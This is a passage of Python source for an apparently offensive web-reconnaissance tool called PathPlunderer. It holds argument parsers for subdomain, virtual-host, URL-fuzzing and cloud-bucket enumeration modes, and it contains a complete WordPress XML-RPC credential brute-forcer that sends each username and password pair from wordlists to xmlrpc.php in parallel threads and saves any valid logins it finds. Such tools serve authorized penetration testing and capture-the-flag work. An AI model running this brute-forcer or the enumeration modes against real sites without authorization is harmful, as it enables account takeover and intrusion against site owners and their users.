    g = p.add_argument_group("Target")
    g.add_argument("--domain","--do", metavar="DOMAIN", dest="domain", required=False, help="Target domain  e.g. example.com  (required)")

    g = p.add_argument_group("Wordlist")
    g.add_argument("-w","--wordlist",   metavar="FILE", dest="wordfile",        help="Path to wordlist  (- for STDIN)  required")
    g.add_argument("--url-file",        metavar="FILE", dest="url_file",        help="Alternative: file with hostnames/words, one per line")
    g.add_argument("--wo","--wordlist-offset", metavar="N", dest="wordlist_offset", type=int, default=0, help="Skip first N words  (resume mid-scan)")
    g.add_argument("-p","--pattern",    metavar="FILE", dest="pattern_file",    help="Pattern substitution file  ({PATTERN} replaced per word)")

    g = p.add_argument_group("DNS Options")
    g.add_argument("--resolver",   metavar="HOST[:PORT]", dest="resolver",    help="Custom DNS server  e.g. 8.8.8.8  or  1.1.1.1:53")
    g.add_argument("--protocol",   metavar="udp|tcp",     dest="protocol",    default="udp", help="Protocol for custom resolver  (default: udp)")
    g.add_argument("-c","--check-cname", action="store_true", dest="check_cname", default=False, help="Also resolve CNAME records for each found subdomain")
    g.add_argument("--wildcard","--wc",  action="store_true", dest="wildcard",    default=False, help="Force scan even when wildcard DNS is detected")
    g.add_argument("--no-fqdn","--nf",   action="store_true", dest="no_fqdn",     default=False, help="Do NOT append trailing dot — uses DNS search domain instead")
    g.add_argument("--dns-timeout",      metavar="SEC",        dest="timeout",     type=float, default=1.0, help="DNS resolver timeout per query  (default: 1s)")

    g = p.add_argument_group("Performance")
    g.add_argument("-t","--threads",  metavar="N",   dest="threads", type=int,   default=10,  help="Concurrent threads  (default: 10)")
    g.add_argument("-d","--delay",    metavar="SEC", dest="delay",   type=float, default=0.0, help="Per-thread delay between queries")

    g = p.add_argument_group("Output")
    g.add_argument("-o","--output",       metavar="FILE", dest="output",      help="Write found subdomains to file")
    g.add_argument("-q","--quiet",        action="store_true", dest="quiet",      default=False, help="Suppress banner")
    g.add_argument("--np","--no-progress",action="store_true", dest="no_progress",default=False, help="Hide progress bar")
    g.add_argument("--ne","--no-error",   action="store_true", dest="no_error",   default=False, help="Suppress DNS error messages")
    g.add_argument("--nc","--no-color",   action="store_true", dest="no_color",   default=False, help="Disable color output")
    g.add_argument("--debug",             action="store_true", dest="debug",      default=False, help="Show raw DNS errors")
    g.add_argument("-h","--help",         action="help",                                          help="Show this help and exit")

    return p


def _build_vhost_parser() -> argparse.ArgumentParser:
    desc = _mode_header("vhost", Fore.BLUE,
        "Virtual host brute-force via Host: header manipulation")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m vhost -u https://IP -w vhosts.txt [--append-domain]\n"
             f"  {Style.DIM}e.g.   pathplunderer.py -m vhost -u https://10.10.10.5 -w names.txt --domain htb.local --append-domain{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(prog="pathplunderer.py -m vhost",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

    g = p.add_argument_group("Target")
    g.add_argument("-u","--url",     metavar="URL",  dest="url",      help="Target URL  (required)")
    g.add_argument("--url-file",     metavar="FILE", dest="url_file", help="File of URLs, one per line")

    g = p.add_argument_group("Wordlist")
    g.add_argument("-w","--wordlist",   metavar="FILE", dest="wordfile",        help="Wordlist path  (required)")
    g.add_argument("--url-file2",       metavar="FILE", dest="url_file",        help="Alternative word source file")
    g.add_argument("--wo","--wordlist-offset", metavar="N", dest="wordlist_offset", type=int, default=0, help="Skip first N words")
    g.add_argument("-p","--pattern",    metavar="FILE", dest="pattern_file",    help="Pattern substitution file")

    g = p.add_argument_group("VHost Options")
    g.add_argument("--append-domain","--ad", action="store_true", dest="append_domain", default=False, help="Append domain to words  word → word.domain.com")
    g.add_argument("--domain","--do",        metavar="DOMAIN",    dest="domain",         help="Domain to append  (extracted from URL if omitted)")
    g.add_argument("--force",                action="store_true", dest="force",          default=False, help="Force scan even when result may be unreliable")
    g.add_argument("--xh","--exclude-hostname-length", action="store_true", dest="exclude_hostname_length", default=False,
                   help="Auto-adjust exclusion size for dynamic hostname-length in responses")
    g.add_argument("--xs","--exclude-status",metavar="CODES",     dest="exclude_status", help="Exclude responses with these status codes  e.g. 302,404")
    g.add_argument("--xl","--exclude-length",metavar="N",         dest="exclude_length", nargs="*", help="Exclude responses of these byte lengths")

    g = p.add_argument_group("Request")
    g.add_argument("-m2","--method",   metavar="M",      dest="method",   default="GET", help="HTTP method  (default: GET)")
    g.add_argument("-H","--headers",   metavar="H:V,...", dest="headers",  default="",   help="Custom headers")
    g.add_argument("--nch",            action="store_true", dest="no_canonicalize_headers", default=False, help="Preserve header casing")
    g.add_argument("-c","--cookies",   metavar="K=V,...", dest="cookies",  default="",   help="Cookies")
    g.add_argument("-U","--username",  metavar="USER",    dest="user",     help="HTTP Basic Auth username")
    g.add_argument("-P","--password",  metavar="PASS",    dest="password", help="HTTP Basic Auth password")
    g.add_argument("-r","--follow-redirect", action="store_true", dest="follow_redirect", default=False, help="Follow redirects")
    g.add_argument("-a","--useragent", metavar="UA",      dest="user_agent", help="Custom User-Agent")
    g.add_argument("--rua",            action="store_true", dest="random_agent", default=False, help="Random User-Agent")

    g = p.add_argument_group("TLS & Proxy")
    g.add_argument("-k","--insecure",  action="store_true", dest="insecure",  default=False, help="Skip TLS verification")
    g.add_argument("--proxy",          metavar="URL",       dest="proxy_url", default="",   help="Proxy URL")
    g.add_argument("--ccp","--client-cert-pem",     metavar="PEM", dest="client_cert", help="mTLS client cert")
    g.add_argument("--ccpk","--client-cert-pem-key",metavar="PEM", dest="client_key",  help="mTLS client key")

    g = p.add_argument_group("Performance")
    g.add_argument("-t","--threads",   metavar="N",   dest="threads", type=int,   default=10,              help="Concurrent threads  (default: 10)")
    g.add_argument("--timeout","--to", metavar="SEC", dest="timeout", type=int,   default=DEFAULT_TIMEOUT,  help="HTTP timeout  (default: 10s)")
    g.add_argument("-d","--delay",     metavar="SEC", dest="delay",   type=float, default=0.0,             help="Per-thread delay")
    g.add_argument("--retry",          action="store_true", dest="retry", default=False,                    help="Retry on timeout")
    g.add_argument("--ra","--retry-attempts", metavar="N", dest="retry_attempts", type=int, default=3,     help="Retry count  (default: 3)")

    g = p.add_argument_group("Output")
    g.add_argument("-o","--output",        metavar="FILE", dest="output",      help="Write results to file")
    g.add_argument("-q","--quiet",         action="store_true", dest="quiet",      default=False, help="Suppress banner")
    g.add_argument("--np","--no-progress", action="store_true", dest="no_progress",default=False, help="Hide progress bar")
    g.add_argument("--ne","--no-error",    action="store_true", dest="no_error",   default=False, help="Suppress errors")
    g.add_argument("--nc","--no-color",    action="store_true", dest="no_color",   default=False, help="Disable color")
    g.add_argument("--debug",              action="store_true", dest="debug",      default=False, help="Debug output")
    g.add_argument("-h","--help",          action="help",                                          help="Show this help and exit")

    return p


def _build_fuzz_parser() -> argparse.ArgumentParser:
    desc = _mode_header("fuzz", Fore.YELLOW,
        "URL / body fuzzer — replaces the FUZZ keyword with wordlist entries")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m fuzz -u 'https://target.com/FUZZ' -w payloads.txt\n"
             f"  {Style.DIM}e.g.   pathplunderer.py -m fuzz -u 'https://target.com/api/FUZZ' -w apis.txt -b 404,400{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(prog="pathplunderer.py -m fuzz",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

    g = p.add_argument_group("Target")
    g.add_argument("-u","--url",     metavar="URL",  dest="url",      help="URL template with FUZZ keyword  e.g. https://site.com/FUZZ  (required)")
    g.add_argument("--url-file",     metavar="FILE", dest="url_file", help="File of URL templates, one per line")

    g = p.add_argument_group("Wordlist")
    g.add_argument("-w","--wordlist",   metavar="FILE", dest="wordfile",        help="Wordlist path  (required)")
    g.add_argument("--wo","--wordlist-offset", metavar="N", dest="wordlist_offset", type=int, default=0, help="Skip first N words")
    g.add_argument("-p","--pattern",    metavar="FILE", dest="pattern_file",    help="Pattern substitution file")

    g = p.add_argument_group("Fuzz Options")
    g.add_argument("-B","--body",             metavar="BODY",  dest="body",        help="Raw POST body containing FUZZ  e.g. 'user=admin&pass=FUZZ'")
    g.add_argument("--data-urlencoded",        metavar="DATA",  dest="data_urlencoded",  default="",  help="URL-encoded body with FUZZ  (auto-sets Content-Type)")
    g.add_argument("--data-json",              metavar="JSON",  dest="data_json",         default="",  help="JSON body with FUZZ  (auto-sets Content-Type: application/json)")
    g.add_argument("-b","--exclude-statuscodes", metavar="CODES", dest="exclude_status", help="Drop responses with these codes  e.g. 404,400-410")
    g.add_argument("--xl","--exclude-length",    metavar="N",     dest="exclude_length", nargs="*", help="Drop responses with these byte lengths")

    g = p.add_argument_group("Request")
    g.add_argument("-m2","--method",   metavar="M",      dest="method",   default="GET", help="HTTP method  (default: GET)")
    g.add_argument("-H","--headers",   metavar="H:V,...", dest="headers",  default="",   help="Custom headers")
    g.add_argument("--nch",            action="store_true", dest="no_canonicalize_headers", default=False, help="Preserve header casing")
    g.add_argument("-c","--cookies",   metavar="K=V,...", dest="cookies",  default="",   help="Cookies")
    g.add_argument("-U","--username",  metavar="USER",    dest="user",     help="HTTP Basic Auth username")
    g.add_argument("-P","--password",  metavar="PASS",    dest="password", help="HTTP Basic Auth password")
    g.add_argument("-r","--follow-redirect", action="store_true", dest="follow_redirect", default=False, help="Follow redirects")
    g.add_argument("-a","--useragent", metavar="UA",      dest="user_agent", help="Custom User-Agent")
    g.add_argument("--rua",            action="store_true", dest="random_agent", default=False, help="Random User-Agent")

    g = p.add_argument_group("TLS & Proxy")
    g.add_argument("-k","--insecure",  action="store_true", dest="insecure",  default=False)
    g.add_argument("--proxy",          metavar="URL",       dest="proxy_url", default="")
    g.add_argument("--ccp",            metavar="PEM",       dest="client_cert")
    g.add_argument("--ccpk",           metavar="PEM",       dest="client_key")

    g = p.add_argument_group("Performance")
    g.add_argument("-t","--threads",   metavar="N",   dest="threads", type=int,   default=10)
    g.add_argument("--timeout","--to", metavar="SEC", dest="timeout", type=int,   default=DEFAULT_TIMEOUT)
    g.add_argument("-d","--delay",     metavar="SEC", dest="delay",   type=float, default=0.0)
    g.add_argument("--retry",          action="store_true", dest="retry", default=False)
    g.add_argument("--ra","--retry-attempts", metavar="N", dest="retry_attempts", type=int, default=3)

    g = p.add_argument_group("Output")
    g.add_argument("-o","--output",        metavar="FILE", dest="output",      help="Write results to file")
    g.add_argument("-q","--quiet",         action="store_true", dest="quiet",      default=False)
    g.add_argument("--np","--no-progress", action="store_true", dest="no_progress",default=False)
    g.add_argument("--ne","--no-error",    action="store_true", dest="no_error",   default=False)
    g.add_argument("--nc","--no-color",    action="store_true", dest="no_color",   default=False)
    g.add_argument("--debug",              action="store_true", dest="debug",      default=False)
    g.add_argument("-h","--help",          action="help",                                          help="Show this help and exit")

    return p


def _build_cloud_parser() -> argparse.ArgumentParser:
    desc = _mode_header("cloud", Fore.GREEN,
        "Multi-cloud bucket enumeration — AWS S3, GCP Storage, Azure Blob  (cloud_enum methodology)")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m cloud -k <KEYWORD> [options]\n"
             f"  {Style.DIM}e.g.   pathplunderer.py -m cloud -k acmecorp -k acme --disable-azure\n"
             f"         pathplunderer.py -m cloud -kf keywords.txt -m mutations.txt -t 10{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(prog="pathplunderer.py -m cloud",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

    g = p.add_argument_group("Keywords  (at least one required)")
    g.add_argument("-k",  "--keyword",  metavar="KEYWORD", dest="keywords",  action="append", default=[], help="Keyword to enumerate  (can repeat: -k acme -k corp)")
    g.add_argument("-kf", "--keyfile",  metavar="FILE",    dest="keyfile",   help="File with one keyword per line")

    g = p.add_argument_group("Mutations & Brute-Force")
    g.add_argument("-M",  "--mutations",metavar="FILE",    dest="mutations", help="File with name mutations/suffixes  (default: built-in list of 40+ variants)")
    g.add_argument("-qs", "--quickscan",action="store_true",dest="quickscan",default=False, help="Disable all mutations — test exact keywords only  (fast)")

    g = p.add_argument_group("Platform Selection")
    g.add_argument("--disable-aws",    action="store_true", dest="disable_aws",   default=False, help="Skip Amazon S3 checks")
    g.add_argument("--disable-gcp",    action="store_true", dest="disable_gcp",   default=False, help="Skip Google Cloud Storage checks")
    g.add_argument("--disable-azure",  action="store_true", dest="disable_azure", default=False, help="Skip Azure Blob / DNS checks")

    g = p.add_argument_group("Options")
    g.add_argument("-t",  "--threads",  metavar="N",         dest="threads",     type=int,   default=5,   help="HTTP threads  (default: 5)")
    g.add_argument("--timeout","--to",  metavar="SEC",       dest="timeout",     type=int,   default=10,  help="HTTP timeout  (default: 10s)")
    g.add_argument("-ns", "--nameserver",metavar="IP",       dest="nameserver",  help="Custom DNS server  (for Azure DNS checks)")
    g.add_argument("-mf", "--max-files",metavar="N",         dest="max_files",   type=int,   default=5,   help="Max files to list from open buckets  (default: 5)")
    g.add_argument("--no-files",        action="store_false",dest="show_files",  default=True,            help="Don't list files from open buckets")
    g.add_argument("--proxy",           metavar="URL",       dest="proxy_url",   default="",              help="Proxy URL")
    g.add_argument("--no-tls-validation","--insecure", action="store_true",dest="insecure",  default=False, help="Skip TLS certificate verification")

    g = p.add_argument_group("Output & Logging")
    g.add_argument("-l",  "--logfile",  metavar="FILE",  dest="logfile",     help="Append found items to this file")
    g.add_argument("-f",  "--format",   metavar="FMT",   dest="log_format",  default="text", help="Log format: text | json | csv  (default: text)")
    g.add_argument("-q",  "--quiet",    action="store_true", dest="quiet",      default=False, help="Suppress banner")
    g.add_argument("--np","--no-progress",action="store_true",dest="no_progress",default=False,help="Hide progress bar")
    g.add_argument("--ne","--no-error", action="store_true", dest="no_error",   default=False, help="Suppress errors")
    g.add_argument("--nc","--no-color", action="store_true", dest="no_color",   default=False, help="Disable color")
    g.add_argument("--debug",           action="store_true", dest="debug",      default=False, help="Debug output")
    g.add_argument("-h",  "--help",     action="help",                                         help="Show this help and exit")

    return p


# ─────────────────────────────────────────────────────────────────────────────
#  ROOT PARSER  (only -m and --help/--version live here)
# ─────────────────────────────────────────────────────────────────────────────

# =============================================================================
#  XMLRPC BRUTE-FORCE SCANNER
# =============================================================================
class XmlRpcScanner:
    """WordPress xmlrpc.php brute-force using wp.getUsersBlogs method."""

    XML_TEMPLATE = (
        "<methodCall>\n"
        "  <methodName>wp.getUsersBlogs</methodName>\n"
        "  <params>\n"
        "    <param><value>{}</value></param>\n"
        "    <param><value>{}</value></param>\n"
        "  </params>\n"
        "</methodCall>"
    )

    def __init__(self, url, userfile, passfile,
                 threads=10, delay=0.0, timeout=10,
                 proxy_url="", insecure=False,
                 output=None, stop_on_first=False,
                 quiet=False, no_progress=False,
                 no_color=False, debug=False):
        self.url          = url.rstrip("/")
        if not self.url.endswith("xmlrpc.php"):
            self.url = self.url.rstrip("/") + "/xmlrpc.php"
        self.threads      = threads
        self.delay        = delay
        self.timeout      = timeout
        self.proxy_url    = proxy_url
        self.insecure     = insecure
        self.output       = output
        self.stop_on_first= stop_on_first
        self.quiet        = quiet
        self.no_progress  = no_progress
        self.no_color     = no_color
        self.debug        = debug
        self._stop        = threading.Event()
        self._lock        = threading.Lock()
        self._print_lock  = threading.Lock()
        self.results: List[Dict] = []
        self.attempt_counter     = 0

        # Load users
        if os.path.exists(userfile):
            with open(userfile, encoding="utf-8", errors="ignore") as f:
                self.users = [l.strip() for l in f if l.strip()]
        else:
            self.users = [userfile]

        # Load passwords
        if os.path.exists(passfile):
            with open(passfile, encoding="utf-8", errors="ignore") as f:
                self.passwords = [l.strip() for l in f if l.strip()]
        else:
            self.passwords = [passfile]

        self.total = len(self.users) * len(self.passwords)
        try: signal.signal(signal.SIGINT, lambda s, f: self._stop.set())
        except (OSError, ValueError): pass

    def _make_session(self) -> requests.Session:
        sess = requests.Session()
        sess.headers.update({"Content-Type": "text/xml"})
        sess.verify = not self.insecure
        if self.proxy_url:
            sess.verify = False
            sess.proxies = {"http": self.proxy_url, "https": self.proxy_url}
        return sess

    def _col(self, s, col, bright=False):
        if self.no_color: return s
        return (Style.BRIGHT if bright else "") + col + s + Style.RESET_ALL

    def _try_cred(self, session: requests.Session, username: str, password: str, pbar) -> bool:
        """Returns True if credentials are valid."""
        if self._stop.is_set(): return False
        if self.delay > 0: time.sleep(self.delay)
        payload = self.XML_TEMPLATE.format(username, password)
        try:
            resp = session.post(self.url, data=payload, timeout=self.timeout)
        except requests.RequestException:
            if pbar: pbar.update(1)
            return False
        with self._lock:
            self.attempt_counter += 1
        if pbar: pbar.update(1)
        if resp.status_code != 200: return False
        if "<fault>" in resp.text: return False
        if "Incorrect username or password" in resp.text: return False
        return True

    def run(self):
        import shutil as _sh
        tw = _sh.get_terminal_size((100, 24)).columns
        div = ("" if self.no_color else Fore.CYAN) + ("=" * tw) + Style.RESET_ALL
        if not self.quiet:
            tqdm.write(pretty_banner(self.no_color))
        tqdm.write(div)
        tqdm.write(self._col("  [XMLRPC] WordPress XML-RPC Brute Force", Fore.RED, True))
        tqdm.write(f"  {'Target':<12} {self.url}")
        tqdm.write(f"  {'Users':<12} {len(self.users)}")
        tqdm.write(f"  {'Passwords':<12} {len(self.passwords)}")
        tqdm.write(f"  {'Total':<12} {self.total} combinations  |  Threads: {self.threads}")
        tqdm.write(div)

        session = self._make_session()
        pbar = (tqdm(total=self.total, desc="  xmlrpc", unit="req", leave=False)
                if not self.no_progress else None)

        def _worker(username: str, password: str):
            if self._stop.is_set(): return
            if self._try_cred(session, username, password, pbar):
                entry = {"username": username, "password": password, "url": self.url}
                with self._lock:
                    self.results.append(entry)
                with self._print_lock:
                    if pbar: pbar.clear()
                    tqdm.write("")
                    tqdm.write(self._col("  [+] VALID CREDENTIALS FOUND!", Fore.GREEN, True))
                    tqdm.write(self._col(f"      Username : {username}", Fore.GREEN))
                    tqdm.write(self._col(f"      Password : {password}", Fore.GREEN))
                    tqdm.write(self._col(f"      Target   : {self.url}", Fore.GREEN))
                if self.stop_on_first:
                    self._stop.set()

        try:
            tasks = [(u, p) for u in self.users for p in self.passwords]
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futs = [ex.submit(_worker, u, p) for u, p in tasks]
                for fut in as_completed(futs):
                    if self._stop.is_set():
                        [f.cancel() for f in futs]; break
                    try: fut.result()
                    except Exception: pass
        finally:
            if pbar: pbar.close()

        tqdm.write(div)
        if self.results:
            tqdm.write(self._col(f"  [XMLRPC] {len(self.results)} valid credential(s) found!", Fore.GREEN, True))
        else:
            tqdm.write(self._col("  [XMLRPC] No valid credentials found.", Fore.RED))
        tqdm.write(f"  [XMLRPC] {self.attempt_counter}/{self.total} combinations tested")
        if self.output and self.results:
            lines = [f"{r['username']}:{r['password']}" for r in self.results]
            with open(self.output, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
            tqdm.write(self._col(f"  [OUTPUT] Saved to {self.output}", Fore.GREEN))
        return self.results


def _build_xmlrpc_parser() -> argparse.ArgumentParser:
    desc = _mode_header("xmlrpc", Fore.RED,
        "WordPress XML-RPC brute-force — tests credentials via wp.getUsersBlogs")
    usage = (f"  {Fore.YELLOW}Usage:{Style.RESET_ALL}  pathplunderer.py -m xmlrpc -u https://target.com -U admin -P passwords.txt\n"
             f"  {Style.DIM}e.g.   pathplunderer.py -m xmlrpc -u https://target.com -U users.txt -P rockyou.txt -t 20{Style.RESET_ALL}\n")
    p = argparse.ArgumentParser(prog="pathplunderer.py -m xmlrpc",
        description=desc + usage, formatter_class=PPHelpFormatter, add_help=False)

    g = p.add_argument_group("Target")
    g.add_argument("-u","--url",      metavar="URL",    dest="url",      required=False,
                   help="WordPress target URL — xmlrpc.php appended automatically  (required)")

    g = p.add_argument_group("Credentials")
    g.add_argument("-U","--username", metavar="USER|FILE", dest="userfile", required=False,
                   help="Single username OR path to username list")
    g.add_argument("-P","--password", metavar="FILE",      dest="passfile", required=False,
                   help="Path to password list  (required)")

    g = p.add_argument_group("Performance")
    g.add_argument("-t","--threads",  metavar="N",    dest="threads", type=int,   default=10,
                   help="Concurrent threads  (default: 10  — keep low if proxying through Burp)")
    g.add_argument("--timeout",       metavar="SEC",  dest="timeout", type=int,   default=10,
                   help="Per-request timeout in seconds  (default: 10)")
    g.add_argument("--delay",         metavar="SEC",  dest="delay",   type=float, default=0.0,
                   help="Delay between requests per thread  (e.g. 0.5)")

    g = p.add_argument_group("Behaviour")
    g.add_argument("--stop-on-first", action="store_true", dest="stop_on_first", default=False,
                   help="Stop immediately after the first valid credential is found")

    g = p.add_argument_group("TLS & Proxy")
    g.add_argument("-k","--insecure", action="store_true", dest="insecure",   default=False,
                   help="Disable TLS certificate verification  (also auto-set when using --proxy)")
    g.add_argument("--proxy",         metavar="URL",       dest="proxy_url",  default="",
                   help="Upstream proxy  e.g. http://127.0.0.1:8080  (Burp Suite)")
    g.add_argument("--burp",          action="store_true", dest="burp",       default=False,
                   help="Shortcut: proxy 127.0.0.1:8080 + insecure  (Burp Suite)")

    g = p.add_argument_group("Output")
    g.add_argument("-o","--output",       metavar="FILE", dest="output",      default=None,
                   help="Save found credentials to file  (format: username:password per line)")
    g.add_argument("-q","--quiet",        action="store_true", dest="quiet",       default=False,
                   help="Suppress banner")
    g.add_argument("--np","--no-progress",action="store_true", dest="no_progress", default=False,
                   help="Hide progress bar")
    g.add_argument("--nc","--no-color",   action="store_true", dest="no_color",    default=False,
                   help="Disable ANSI colours")
    g.add_argument("--debug",             action="store_true", dest="debug",       default=False,
                   help="Show full error tracebacks")
    g.add_argument("-h","--help",          action="help",
                   help="Show this help and exit")
    return p

MODES = {
    "dir":       (_build_dir_parser,       Fore.GREEN,   "Web directory & file brute-force + 403 bypass + Wayback + secrets"),
    "subdomain": (_build_subdomain_parser, Fore.MAGENTA, "DNS subdomain brute-force / enumeration"),
    "vhost":     (_build_vhost_parser,     Fore.BLUE,    "Virtual host brute-force via Host: header"),
    "fuzz":      (_build_fuzz_parser,      Fore.YELLOW,  "URL / body fuzzer  (replaces FUZZ keyword)"),
    "cloud":     (_build_cloud_parser,     Fore.CYAN,    "Multi-cloud bucket enum  (S3 + GCP + Azure)"),
    "xmlrpc":    (_build_xmlrpc_parser,    Fore.RED,     "WordPress XML-RPC brute-force via xmlrpc.php"),
}


def _print_root_help():
    tqdm.write(pretty_banner(no_color=False))
    tqdm.write(_divider("═"))
    tqdm.write(Fore.CYAN + Style.BRIGHT + "  USAGE" + Style.RESET_ALL)
    tqdm.write(f"    pathplunderer.py {Fore.YELLOW}-m <mode>{Style.RESET_ALL} [options]")
    tqdm.write(f"    pathplunderer.py {Fore.YELLOW}-m <mode> --help{Style.RESET_ALL}  for mode-specific options\n")
    tqdm.write(Fore.CYAN + Style.BRIGHT + "  MODES" + Style.RESET_ALL)
    for name, (_, color, desc) in MODES.items():
        tqdm.write(f"    {color + Style.BRIGHT}{name:<12}{Style.RESET_ALL}  {desc}")
    tqdm.write("")
    tqdm.write(Fore.CYAN + Style.BRIGHT + "  EXAMPLES" + Style.RESET_ALL)
    examples = [
        ("dir",       "-u https://target.com -w common.txt --probe --secrets"),
        ("dir",       "-u https://target.com -w common.txt --bypass-403 --wayback"),
        ("dir",       "-u https://target.com -w common.txt --bypass-only"),
        ("dir",       "-u https://target.com -w common.txt --wayback-only --wayback-all"),
        ("subdomain", "--domain target.com -w subdomains.txt --resolver 8.8.8.8"),
        ("vhost",     "-u https://10.10.10.5 -w names.txt --domain htb.local --append-domain"),
        ("fuzz",      "-u 'https://target.com/api/v1/FUZZ' -w endpoints.txt"),
        ("cloud",     "-k acmecorp -k acme-inc --disable-azure"),
        ("cloud",     "-kf keywords.txt -M mutations.txt -t 10"),
        ("xmlrpc",    "-u https://target.com -U admin -P rockyou.txt -t 20"),
        ("xmlrpc",    "-u https://target.com -U users.txt -P passwords.txt --stop-on-first"),
    ]
    for mode, rest in examples:
        tqdm.write(f"    {Style.DIM}pathplunderer.py -m {mode} {rest}{Style.RESET_ALL}")
    tqdm.write("")
    tqdm.write(_divider("═"))


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    # ── Step 1: extract -m / --mode before full parse ──
    raw_args = sys.argv[1:]

    # Show root help if nothing given
    if not raw_args or raw_args == ["-h"] or raw_args == ["--help"]:
        _print_root_help()
        sys.exit(0)

    if "--version" in raw_args:
        print(f"PathPlunderer v{VERSION}")
        sys.exit(0)

    # Extract mode
    mode = None
    rest_args = []
    i = 0
    while i < len(raw_args):
        if raw_args[i] in ("-m", "--mode") and i + 1 < len(raw_args):
            mode = raw_args[i + 1].lower()
            i += 2
        else:
            rest_args.append(raw_args[i])
            i += 1

    if mode is None:
        _print_root_help()
        print(Fore.RED + "\n  [ERROR] -m / --mode is required. Choose: " +
              ", ".join(MODES.keys()) + Style.RESET_ALL)
        sys.exit(1)

    if mode not in MODES:
        print(Fore.RED + f"  [ERROR] Unknown mode '{mode}'. Valid: {', '.join(MODES.keys())}" + Style.RESET_ALL)
        sys.exit(1)

    builder_fn, _, _ = MODES[mode]
    mode_parser = builder_fn()

    # Show mode help if no args or --help
    if not rest_args or "--help" in rest_args or "-h" in rest_args:
        mode_parser.print_help()
        sys.exit(0)

    args = mode_parser.parse_args(rest_args)

    # ── Helper: load URL from --url-file ──
    def _resolve_url_file(args_obj, for_wordlist=False):
        uf = getattr(args_obj, "url_file", None)
        if not uf: return
        try:
            with open(uf, encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"[ERROR] url-file not found: {uf}" + Style.RESET_ALL); sys.exit(1)
        if lines:
            if not getattr(args_obj, "url", None):
                args_obj.url = lines[0]
            # If wordfile not set, use the file as wordlist too
            if for_wordlist and (not getattr(args_obj,"wordfile",None) or args_obj.wordfile == "-"):
                args_obj.wordfile = uf

    # ─────────────────────────────────────────────────────────────────────
    #  DIR
    # ─────────────────────────────────────────────────────────────────────
    if mode == "dir":
        if hasattr(args,"thorough") and args.thorough:
            args.smart = True; args.collect_extensions = True
            args.extract_secrets = True; args.probe = True
        if hasattr(args,"smart") and args.smart:
            args.collect_words = True; args.collect_backups = True

        if hasattr(args,"exts_file") and args.exts_file:
            ef = Path(args.exts_file)
            if ef.exists():
                args.exts = lister(",".join(l.strip() for l in ef.read_text().splitlines() if l.strip()))

        _resolve_url_file(args, for_wordlist=False)

        bypass_urls_extra = []
        if getattr(args,"bypass_only",False):
            all_raw = []
            if getattr(args,"url",None):
                all_raw.extend(u.strip() for u in args.url.split(",") if u.strip())
            raw_extra = getattr(args,"bypass_urls_raw","") or ""
            if raw_extra:
                all_raw.extend(u.strip() for u in raw_extra.split(",") if u.strip())
            if not all_raw:
                print(Fore.RED + "[ERROR] --bypass-only needs at least one URL via -u" + Style.RESET_ALL); sys.exit(1)
            args.url = all_raw[0]; bypass_urls_extra = all_raw[1:]
            if getattr(args,"wordfile","-") == "-": args.wordfile = os.devnull
        elif not getattr(args,"url",None):
            mode_parser.error("-u/--url is required")

        try:
            scanner = PathPlunderer(
                url=args.url, wordfile=getattr(args,"wordfile","-"),
                threads=args.threads, exts=getattr(args,"exts",None),
                logfile=getattr(args,"logfile",None), codes=args.codes,
                blacklist_codes=args.blacklist_codes, user=args.user,
                password=args.password, force=args.force,
                user_agent=getattr(args,"user_agent",None),
                random_agent=getattr(args,"random_agent",False),
                proxy_url=getattr(args,"proxy_url",""),
                replay_proxy=getattr(args,"replay_proxy",""),
                insecure=args.insecure, timeout=args.timeout,
                follow_redirect=args.follow_redirect, cookies=args.cookies,
                headers=args.headers,
                no_canonicalize_headers=getattr(args,"no_canonicalize_headers",False),
                methods=getattr(args,"methods","GET"),
                data=getattr(args,"data",""),
                data_json=getattr(args,"data_json",""),
                data_urlencoded=getattr(args,"data_urlencoded",""),
                add_slash=getattr(args,"add_slash",False),
                bypass_403=getattr(args,"bypass_403",False),
                bypass_only=getattr(args,"bypass_only",False),
                bypass_urls=bypass_urls_extra,
                wayback=getattr(args,"wayback",False),
                wayback_only=getattr(args,"wayback_only",False),
                wayback_all=getattr(args,"wayback_all",False),
                wayback_output=getattr(args,"wayback_output",None),
                wayback_filter_status=getattr(args,"wayback_filter_status",None),
                extract_secrets=getattr(args,"extract_secrets",False),
                extract_links=getattr(args,"extract_links",False),
                wp_detect=getattr(args,"wp_detect",False),
                probe=getattr(args,"probe",False),
                crawl=getattr(args,"crawl",True),
                rate_limit=getattr(args,"rate_limit",0),
                delay=getattr(args,"delay",0.0),
                retry=getattr(args,"retry",False),
                retry_attempts=getattr(args,"retry_attempts",DEFAULT_RETRY),
                quiet=args.quiet, no_progress=args.no_progress,
                no_error=args.no_error, no_color=args.no_color,
                no_status=getattr(args,"no_status",False),
                hide_length=getattr(args,"hide_length",False),
                output_json=getattr(args,"output_json",False),
                verbose=getattr(args,"verbose",0),
                no_recursion=getattr(args,"no_recurse",False),      # --no-recurse disables all recursion
                smart_recurse=(not getattr(args,"no_recurse",False) and not getattr(args,"full_recurse",False)),
                depth=getattr(args,"depth",DEFAULT_DEPTH),
                filter_size=getattr(args,"filter_size",None),
                filter_words=getattr(args,"filter_words",None),
                filter_lines=getattr(args,"filter_lines",None),
                filter_regex=getattr(args,"filter_regex",None),
                filter_status=getattr(args,"filter_status",None),
                filter_similar=getattr(args,"filter_similar",None),
                exclude_length=getattr(args,"exclude_length",None),
                collect_backups=getattr(args,"collect_backups",False),
                collect_extensions=getattr(args,"collect_extensions",False),
                collect_words=getattr(args,"collect_words",False),
                wordlist_offset=getattr(args,"wordlist_offset",0),
                client_cert=getattr(args,"client_cert",None),
                client_key=getattr(args,"client_key",None),
                debug=getattr(args,"debug",False),
